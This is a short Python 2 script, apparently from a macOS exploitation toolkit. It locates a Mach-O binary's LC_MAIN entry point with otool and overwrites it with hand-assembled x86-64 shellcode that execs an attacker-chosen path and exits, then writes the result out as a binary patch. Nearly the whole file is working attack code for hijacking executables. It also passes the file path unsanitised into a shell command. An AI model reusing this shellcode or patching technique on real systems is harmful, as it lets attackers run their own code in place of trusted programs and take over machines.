#!/usr/bin/env python

'''
given a path to a binary and a target to exec build the binary patch file required to make
an exec of the binary in fact exec the target
'''

import sys
import subprocess

from differ import do_diff

def find_entrypoint(path):
  '''
  just use otool to pull the entrypoint out the LC_MAIN load command...
  for older versions of OS X you need to use the unixthread
  '''
  s = subprocess.check_output('otool -l ' + path + ' | egrep LC_MAIN -A 2 | egrep entryoff | egrep --only-matching "[0-9]+"', shell=True)
  return int(s)

def patch_in_shellcode(original_bytes, entrypoint, target_to_exec):
  c = ("\xeb\x1f"             # jmp get_path
   # got_path:
       "\x5f"                 # pop rdi
       "\x48\x31\xdb"         # xor rbx,rbx
       "\x53"                 # push rbx
       "\x57"                 # push rdi
       "\x48\x89\xe6"         # mov rsi,rsp
       "\x48\x31\xd2"         # xor rdx,rdx
       "\xb8\x3b\x00\x00\x02" # mov eax,0x200003b   ; BSD syscall family | syscall_exec
       "\x0f\x05"             # syscall
       "\xbf\x01\x00\x00\x00" # mov edi, 1
       "\xb8\x01\x00\x00\x02" # mov eax,0x2000001   ; BSD syscall family | syscall_exit
       "\x0f\x05"             # syscall

   # get_path:
       "\xe8\xdc\xff\xff\xff" # call got_path
  ) + target_to_exec + '\x00'

  patched_bytes = original_bytes[:entrypoint] + c + original_bytes[entrypoint+len(c):]

  return patched_bytes

def patch_exec_shellcode(binary, target_to_exec):
  entrypoint = find_entrypoint(binary)

  original_bytes = open(binary).read()

  patched_bytes = patch_in_shellcode(original_bytes, entrypoint, target_to_exec)

  diff = do_diff(original_bytes, patched_bytes)
  
  return diff

def usage():
  print 'python build_exec_patch.py binary_to_patch target_to_exec output'
  exit(1)


if __name__ == '__main__':
  if len(sys.argv) < 4:
    usage()

  binary         = sys.argv[1]
  target_to_exec = sys.argv[2]
  ofile          = sys.argv[3]

  diff = patch_exec_shellcode(binary, target_to_exec)

  open(ofile, 'w').write(diff)
